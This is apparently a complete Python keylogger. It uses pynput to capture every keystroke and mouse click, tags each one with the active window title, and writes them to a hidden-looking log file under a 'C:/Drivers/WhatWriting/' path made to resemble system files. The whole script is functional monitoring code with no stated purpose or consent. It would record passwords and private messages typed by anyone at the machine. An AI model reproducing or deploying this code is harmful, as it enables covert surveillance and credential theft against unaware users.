import logging
from pynput import keyboard, mouse
import pygetwindow as gw

# Set up logging
log_dir = r"C:/Drivers/WhatWriting/"
logging.basicConfig(filename=(log_dir + "mistekst.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def log_active_window():
    try:
        # Get the active window title
        active_window = gw.getActiveWindow()
        if active_window:
            return active_window.title
        else:
            return "No active window"
    except Exception as e:
        return str(e)

def on_click(x, y, button, pressed):
    if pressed:
        active_window = log_active_window()
        logging.info(f"Mouse clicked at ({x}, {y}) in '{active_window}'")

def on_press(key):
    active_window = log_active_window()
    logging.info(f"Key {str(key)} pressed in '{active_window}'")

# Start listening to mouse and keyboard events
with mouse.Listener(on_click=on_click) as mouse_listener, keyboard.Listener(on_press=on_press) as keyboard_listener:
    mouse_listener.join()
    keyboard_listener.join()